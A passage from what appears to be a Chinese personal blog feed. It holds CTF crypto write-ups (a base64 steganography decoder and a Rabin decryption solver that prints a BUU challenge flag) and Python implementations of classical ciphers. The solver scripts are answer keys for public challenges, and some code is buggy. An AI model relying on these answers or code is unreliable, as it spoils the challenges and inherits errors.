        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res


<span class="token keyword">def</span> <span class="token function">solve_stego</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'0.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        file_lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
        bin_str <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> file_lines<span class="token punctuation">:</span>
            steg_line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
            norm_line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
            diff <span class="token operator">=</span> get_base64_diff_value<span class="token punctuation">(</span>steg_line<span class="token punctuation">,</span> norm_line<span class="token punctuation">)</span>
            <span class="token keyword">print</span> diff
            pads_num <span class="token operator">=</span> steg_line<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> diff<span class="token punctuation">:</span>
                bin_str <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>pads_num <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                bin_str <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> pads_num <span class="token operator">*</span> <span class="token number">2</span>
            <span class="token keyword">print</span> goflag<span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">goflag</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res_str <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        res_str <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res_str


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    solve_stego<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="坏蛋是雷宾"><a href="#坏蛋是雷宾" class="headerlink" title="坏蛋是雷宾"></a>坏蛋是雷宾</h1><ul>
<li>Rabin算法</li>
</ul>
<p>原理详见：<a href="https://wiki.x10sec.org/crypto/asymmetric/rsa/rsa_e_attack/">https://wiki.x10sec.org/crypto/asymmetric/rsa/rsa_e_attack/</a><br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> hashlib

n<span class="token operator">=</span><span class="token number">523798549</span>
p<span class="token operator">=</span><span class="token number">10663</span>
q<span class="token operator">=</span><span class="token number">49123</span>
e<span class="token operator">=</span><span class="token number">2</span>
c<span class="token operator">=</span><span class="token number">162853095</span>
inv_p <span class="token operator">=</span> invert<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>
inv_q <span class="token operator">=</span> invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>

mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token punctuation">(</span>inv_p <span class="token operator">*</span> p <span class="token operator">*</span> mq <span class="token operator">+</span> inv_q <span class="token operator">*</span> q <span class="token operator">*</span> mp<span class="token punctuation">)</span> <span class="token operator">%</span> n
b <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token punctuation">(</span>inv_p <span class="token operator">*</span> p <span class="token operator">*</span> mq <span class="token operator">-</span> inv_q <span class="token operator">*</span> q <span class="token operator">*</span> mp<span class="token punctuation">)</span> <span class="token operator">%</span> n
d <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment">#10010011100100100101010110001  </span>
m<span class="token operator">=</span><span class="token string">'10010011100100100101010'</span>
mc<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
md<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
md<span class="token punctuation">.</span>update<span class="token punctuation">(</span>mc<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>BUU</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学实践（一）</title>
    <url>/2020/07/16/mi-ma-xue-shi-jian-yi/</url>
    <content><![CDATA[<p>前前后后忙了近半个月，总算是把实践弄完了<br>记录一下密码学的基础知识吧</p>
<span id="more"></span>
<h1 id="单表替代密码"><a href="#单表替代密码" class="headerlink" title="单表替代密码"></a>单表替代密码</h1><h2 id="Caesar-Cipher"><a href="#Caesar-Cipher" class="headerlink" title="Caesar Cipher"></a>Caesar Cipher</h2><p>恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    re_str <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> plaintext<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> i<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            re_str <span class="token operator">+=</span> i  <span class="token comment"># 判断是否为字母，若不是则不需要操作</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            a <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token keyword">if</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"a"</span>  
            <span class="token comment"># 根据当前字母是否大小写，确定其ASCII码范围值</span>
            re_str <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> re_str

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> encrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token number">26</span> <span class="token operator">-</span> key<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Keyword-Cipher"><a href="#Keyword-Cipher" class="headerlink" title="Keyword Cipher"></a>Keyword Cipher</h2><p>关键字（词）密码，给定一个关键字key（假定），得到关键字列表：“keyabcdfghijlmnopqrstuvwxz”，然后对照明文，按照“a”-&gt;“k”，“b”-&gt;“e”，…，来进行替换</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getKeywordList</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 主要用于生成密码表 """</span>
    normalList <span class="token operator">=</span> <span class="token string">''</span>
    keyword <span class="token operator">=</span> keyword<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        normalList <span class="token operator">=</span> normalList <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>
    toCombine <span class="token operator">=</span> keyword <span class="token operator">+</span> normalList
    combineList <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> toCombine<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token keyword">in</span> combineList<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            combineList <span class="token operator">=</span> combineList <span class="token operator">+</span> i
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>combineList<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">26</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> combineList
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">replaceChar</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> inputChar<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    对于大写字母，就先转换为小写然后继续调用改函数
    转换至小写字母后，得到该字母在字母表上的位置然后使用keywordList替换即可
    """</span>
    <span class="token keyword">if</span> inputChar<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> replaceChar<span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> inputChar<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> keywordList<span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>inputChar<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">dereplaceChar</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> inputChar<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 解密函数就是加密函数的逆过程 """</span>
    <span class="token keyword">if</span> inputChar<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> dereplaceChar<span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> inputChar<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">.</span>find<span class="token punctuation">(</span>inputChar<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>toReplace<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" keyword 字符替换法 替换函数 """</span>
    afterReplace <span class="token operator">=</span> <span class="token string">''</span>
    keywordList <span class="token operator">=</span> getKeywordList<span class="token punctuation">(</span>keyword<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> toReplace<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            afterReplace <span class="token operator">=</span> afterReplace <span class="token operator">+</span> replaceChar<span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            afterReplace <span class="token operator">=</span> afterReplace <span class="token operator">+</span> i
    <span class="token keyword">return</span> afterReplace

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>toReplace<span class="token punctuation">,</span> keyword<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" keyword 字符替换法  反替换函数 """</span>
    afterReplace <span class="token operator">=</span> <span class="token string">''</span>
    keywordList <span class="token operator">=</span> getKeywordList<span class="token punctuation">(</span>keyword<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> toReplace<span class="token punctuation">:</span>
        <span class="token keyword">if</span> i<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            afterReplace <span class="token operator">=</span> afterReplace <span class="token operator">+</span> dereplaceChar<span class="token punctuation">(</span>keywordList<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            afterReplace <span class="token operator">=</span> afterReplace <span class="token operator">+</span> i
    <span class="token keyword">return</span> afterReplace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Affine-Cipher"><a href="#Affine-Cipher" class="headerlink" title="Affine Cipher"></a>Affine Cipher</h2><p>仿射密码为单表加密的一种，字母系统中所有字母都藉一简单数学方程加密，对应至数值，或转回字母</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 求a，b的最大公因数，仿射密码中，a与b互素 """</span>
    <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span>
        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a
    <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        temp <span class="token operator">=</span> a <span class="token operator">%</span> b
        a <span class="token operator">=</span> b
        b <span class="token operator">=</span> temp
    <span class="token keyword">return</span> a

<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 扩展欧几里得算法，用于之后求逆元 """</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
        <span class="token keyword">return</span> g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y

<span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 求逆元 """</span>
    g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span>
    <span class="token keyword">if</span> g <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'modular inverse does not exist'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> x <span class="token operator">%</span> m

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 加密函数：E(x) = (ax + b)(mod m) m为编码系统中的字母数，一般为26 """</span>
    cipher <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> plaintext<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> i<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            cipher <span class="token operator">+=</span> i
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            n <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token keyword">if</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"a"</span>
            cipher <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cipher

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 解密函数：D(x) = a^-1 * (x - b)(mod m) a^-1:a在m上的乘法逆元 """</span>
    a1 <span class="token operator">=</span> modinv<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>
    plain <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> i<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            plain <span class="token operator">+=</span> i
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            n <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token keyword">if</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"a"</span>
            plain <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Multiliteral-Cipher"><a href="#Multiliteral-Cipher" class="headerlink" title="Multiliteral Cipher"></a>Multiliteral Cipher</h2><p>与棋盘密码相识，不过棋盘密码中是将字母替换为数字，而在Multiliteral中，是替换为字母<br>给出一个长度为5的单词，然后将26个字母排成5*5的矩阵，其中i和j合在一起，对照着明文的每一个字母，找到字母在矩阵中的位置，将其替换为key中相应位置的两个字母</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">removePunctuation</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">filter</span> <span class="token operator">=</span> <span class="token string">'[^A-Z]'</span>
    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> text<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 主要算法，获取加密字母在二维字母表中的行列值，其密文为与之对应的key中位置的相应字母 """</span>
    plain <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> key<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        row <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>plain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span>
        cipher <span class="token operator">+=</span> key<span class="token punctuation">[</span>row<span class="token punctuation">]</span>
        col <span class="token operator">=</span> keywordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>plain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span>
        cipher <span class="token operator">+=</span> key<span class="token punctuation">[</span>col<span class="token punctuation">]</span>
    <span class="token keyword">return</span> cipher

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 主要算法：对密文两两遍历，找到相应字母在key中的位置，分别对应明文在字母表中的行列 """</span>
    cipher <span class="token operator">=</span> removePunctuation<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> key<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>
    plain <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        row <span class="token operator">=</span> key<span class="token punctuation">.</span>index<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        col <span class="token operator">=</span> key<span class="token punctuation">.</span>index<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> row <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> col
        plain <span class="token operator">+=</span> keywordList<span class="token punctuation">[</span>num<span class="token punctuation">]</span>
